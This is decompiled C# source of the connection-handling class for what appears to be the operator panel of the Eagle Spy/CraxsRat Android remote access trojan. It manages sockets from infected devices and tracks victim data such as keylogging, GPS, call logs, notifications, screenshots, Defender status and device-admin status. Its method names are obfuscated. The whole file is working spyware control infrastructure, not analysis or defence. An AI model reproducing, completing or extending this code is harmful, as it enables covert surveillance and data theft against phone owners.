using System;
using System.Data;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Eagle_Spy.My;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy.sockets;

public class Client
{
	public string Keys;

	public string ClientAddressIP;

	public string ClientRemoteAddress;

	public string ActiveNow;

	public string ClientLocalAddress;

	public byte[] buffer;

	public MemoryStream MemoryStream;

	public long Maxsize;

	public bool isconnected;

	public int Count;

	public Size ScreenSize;

	public object[] SizeData;

	public DataGridViewRow Row;

	public DataTable FirewallTable;

	public DataTable TrackedAppsTable;

	public string[] TrackedDatesFounded;

	public bool needpong;

	public bool IsonVPN;

	public bool qit;

	public bool qitGPS;

	public bool shot;

	public bool Keylogg;

	public Bitmap Flag;

	public string Screen;

	public string Battery;

	public string Country;

	public string android;

	public string ClientName;

	public string UUID;

	public string FolderUSER;

	public string host;

	public string Statistics;

	public string BatteryCharge;

	public string[] CALLS;

	public bool isnewcall;

	public int ID;

	private readonly object @lock;

	public bool EXI;

	public Bitmap Wallpaper;

	public Bitmap WallpaperBackup;

	public bool power;

	public bool isnewnotifi;

	public int CountPoing;

	public string VersionClient;

	public Accept MyServer;

	public TcpClient myClient;

	public int uptime;

	public string ClientDefender;

	public string installdate;

	public string Phone_model;

	public string[] Notifications;

	public bool isready;

	public bool MaxPower;

	public bool pooked;

	public bool IsAdminActive;

	public bool IsReal;

	public bool Isv4;

	public Bitmap Wifi;

	public DateTime mydatestart;

	private readonly object mylock;

	public void CraxsRatkfvuiorkenfjhvkjhjklCraxsRatsmkasytw(TcpClient ParametersClient, int ParametersInteger, Accept sk)
	{
		try
		{
			MyServer = sk;
			myClient = ParametersClient;
			myClient.Client.ReceiveTimeout = -1;
			myClient.Client.SendTimeout = -1;
			myClient.Client.SendBufferSize = 5242880;
			myClient.Client.ReceiveBufferSize = 5242880;
			ClientRemoteAddress = ((IPEndPoint)ParametersClient.Client.RemoteEndPoint).ToString();
			ClientAddressIP = ((IPEndPoint)ParametersClient.Client.RemoteEndPoint).Address.ToString();
			ClientLocalAddress = $"{ClientAddressIP}:{Conversions.ToString(ParametersInteger)}";
			isconnected = true;
			uptime = 60;
			isready = false;
			Wallpaper = null;
			Screen = "3";
			Wifi = null;
			WallpaperBackup = null;
			FirewallTable = new DataTable();
			TrackedAppsTable = new DataTable();
			Maxsize = -1L;
			Count = -1;
			Row = null;
			shot = true;
			qitGPS = false;
			qit = false;
			Keylogg = false;
			Keys = "0.0.0.0:0:null:null:null:null:0.0.0.0:0000:0";
			MemoryStream = new MemoryStream();
			buffer = new byte[1];
			SizeData = new object[2] { -1, -1 };
			mydatestart = DateTime.Now.AddSeconds(45.0);
			try
			{
				if (!MyServer.Blocklist.Contains(ClientAddressIP))
					myClient.Client.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, CraxsRatkfvuiorkenfudpajrsnCraxsRatsthaszxy, myClient.Client);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Thread thread = new Thread(updatedata);
			thread.IsBackground = true;
			thread.Start();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void updatedata()
	{
		while (true)
		{
			try
			{
				do
				{
					Thread.Sleep(45000);
				}
				while (isconnected);
				Close(myClient);
				break;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public Client(TcpClient ParametersClient, int ParametersInteger, Accept sk)
	{
		ActiveNow = "";
		isconnected = false;
		needpong = false;
		IsonVPN = false;
		Country = "null";
		android = "null";
		ClientName = "null";
		UUID = "null";
		FolderUSER = "null";
		host = "null";
		Statistics = "null";
		BatteryCharge = "null";
		isnewcall = false;
		ID = 0;
		@lock = RuntimeHelpers.GetObjectValue(new object());
		EXI = false;
		power = false;
		isnewnotifi = false;
		CountPoing = 0;
		VersionClient = "n/a";
		isready = false;
		MaxPower = false;
		pooked = false;
		IsAdminActive = false;
		IsReal = false;
		mylock = RuntimeHelpers.GetObjectValue(new object());
		CraxsRatkfvuiorkenfjhvkjhjklCraxsRatsmkasytw(ParametersClient, ParametersInteger, sk);
	}

	public void SendMessage(object[] ParametersObjects)
	{
		try
		{
			byte[] bByte = Codes.FormatPacket((string)ParametersObjects[1], (byte[])ParametersObjects[2]);
			Sender(bByte);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void SendCallback(IAsyncResult ar)
	{
		try
		{
			TcpClient tcpClient = (TcpClient)ar.AsyncState;
			tcpClient.Client.EndSend(ar);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void Sender(byte[] bByte)
	{
		Thread thread = new Thread(checked([SpecialName] () =>
		{
			object obj = @lock;
			ObjectFlowControl.CheckForSyncLockOnValueType(obj);
			bool lockTaken = false;
			try
			{
				Monitor.Enter(obj, ref lockTaken);
				Thread.Sleep(1);
				try
				{
					if (isconnected)
					{
						myClient.Client.Poll(-1, SelectMode.SelectWrite);
						myClient.Client.SendBufferSize = bByte.Length;
						myClient.Client.Send(bByte, 0, bByte.Length, SocketFlags.None);
						MyServer.BytesSent += bByte.Length;
					}
				}
				catch (SocketException projectError)
				{
					ProjectData.SetProjectError(projectError);
					isconnected = false;
					ProjectData.ClearProjectError();
				}
				catch (ObjectDisposedException projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					isconnected = false;
					ProjectData.ClearProjectError();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					isconnected = false;
					ProjectData.ClearProjectError();
				}
			}
			finally
			{
				if (lockTaken)
					Monitor.Exit(obj);
			}
		}));
		thread.IsBackground = true;
		thread.Start();
	}

	public void Blockme(string ip)
	{
		if (!MyServer.Blocklist.Contains(ip))
		{
			MyServer.Blocklist.Add(ip);
			Data.MainForm.DGVblocked.Rows.Add(Flag, ip);
		}
	}

	public void CraxsRatkfvuiorkenfudpajrsnCraxsRatsthaszxy(IAsyncResult ar)
	{
		int num;
		try
		{
			num = myClient.Client.EndReceive(ar);
		}
		catch (SocketException projectError)
		{
			ProjectData.SetProjectError(projectError);
			num = -1;
			ProjectData.ClearProjectError();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			num = -1;
			ProjectData.ClearProjectError();
		}
		checked
		{
			if (num > 0)
			{
				try
				{
					MyServer.BytesReceived += num;
					if (Maxsize == -1L)
					{
						if (buffer[0] == 0)
						{
							MemoryStream.WriteByte(buffer[0]);
							Count++;
							if (Count == 1)
							{
								string text = Codes.Encoding().GetString(MemoryStream.ToArray()).Trim();
								string[] array = text.Split(new char[1], StringSplitOptions.None);
								long num2 = (Versioned.IsNumeric(array[0].Trim()) ? Conversions.ToLong(array[0].Trim()) : 0L);
								long num3 = (Versioned.IsNumeric(array[1].Trim()) ? Conversions.ToLong(array[1].Trim()) : 0L);
								SizeData = new object[2] { num2, num3 };
								Maxsize = num2 + num3;
								long maxsize = Maxsize;
								myClient.Client.ReceiveBufferSize = (int)maxsize;
								Count = -1;
								buffer = new byte[(int)(Maxsize - 1L) + 1 - 1 + 1];
								MemoryStream.Dispose();
								MemoryStream = new MemoryStream();
							}
						}
						else
							MemoryStream.WriteByte(buffer[0]);
					}
					else
					{
						MemoryStream.Write(buffer, 0, num);
						if (MemoryStream.ToArray().Length == Maxsize)
						{
							ListData listData = new ListData(this, MemoryStream.ToArray(), SizeData, myClient);
							object objectValue = RuntimeHelpers.GetObjectValue(MyServer.SyncObj);
							object obj = objectValue;
							ObjectFlowControl.CheckForSyncLockOnValueType(obj);
							bool lockTaken = false;
							try
							{
								Monitor.Enter(obj, ref lockTaken);
								MyServer.RequestsReceiver.Add(listData);
							}
							finally
							{
								if (lockTaken)
									Monitor.Exit(obj);
							}
							do
							{
								Thread.Sleep(1);
								Application.DoEvents();
							}
							while (!listData.wait);
							MemoryStream.Dispose();
							MemoryStream = new MemoryStream();
							SizeData = new object[2] { -1, -1 };
							Maxsize = -1L;
							buffer = new byte[1];
						}
						else
							buffer = new byte[(int)(Maxsize - MemoryStream.Length - 1L) + 1 - 1 + 1 - 1 + 1];
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				try
				{
					if (myClient.Client.Connected)
						myClient.Client.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, CraxsRatkfvuiorkenfudpajrsnCraxsRatsthaszxy, myClient.Client);
					else
						isconnected = false;
					return;
				}
				catch (SocketException projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					isconnected = false;
					ProjectData.ClearProjectError();
					return;
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					isconnected = false;
					ProjectData.ClearProjectError();
					return;
				}
			}
			isconnected = false;
		}
	}

	public void Close(TcpClient client)
	{
		try
		{
			if (!EXI)
			{
				EXI = true;
				qit = true;
				isconnected = false;
				Thread thread = new Thread(close_async);
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void close_async()
	{
		try
		{
			if (FirewallTable.Rows.Count > 0)
				Data.MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					FirewallTable.Rows.Clear();
					FirewallTable.Dispose();
				}));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (TrackedAppsTable.Rows.Count > 0)
				Data.MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					TrackedAppsTable.Rows.Clear();
					TrackedAppsTable.Dispose();
				}));
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		if (MemoryStream != null)
			try
			{
				MemoryStream.Dispose();
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		if (myClient != null)
		{
			try
			{
				if (myClient.Client.Connected)
					myClient.GetStream().Close();
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
			try
			{
				myClient.Client.Close();
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			if (Row != null)
			{
				Data.MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
				{
					Data.LOGIT(this, "Disconnected", Flag);
					if (Operators.CompareString(MySettingsProperty.Settings.ShowAlertDis, "Yes", TextCompare: false) == 0)
						CraxsAlert.ShowCustome("Connection Lost", Wallpaper, Color.Black, Color.FromArgb(157, 5, 17));
				}));
				Data.MainForm.RemoveCard(Row, UUID);
				Row = null;
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (ClientRemoteAddress != null && Data.ClientsOnline.Contains(ClientRemoteAddress))
				Data.ClientsOnline.Remove(ClientRemoteAddress);
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
	}

	public int Progresr()
	{
		int num = 0;
		int result;
		if (Maxsize == -1L)
			result = num;
		else
			try
			{
				num = checked(RateConverter((int)MemoryStream.Length, (int)Maxsize));
				result = num;
			}
			catch (ObjectDisposedException projectError)
			{
				ProjectData.SetProjectError(projectError);
				result = 0;
				ProjectData.ClearProjectError();
			}
		return result;
	}

	public int RateConverter(int Value, int Totalsize)
	{
		int result;
		try
		{
			result = ((Totalsize != 0) ? checked((int)Math.Round((double)Value / (double)Totalsize * 100.0)) : 0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			result = 0;
			ProjectData.ClearProjectError();
		}
		return result;
	}
}
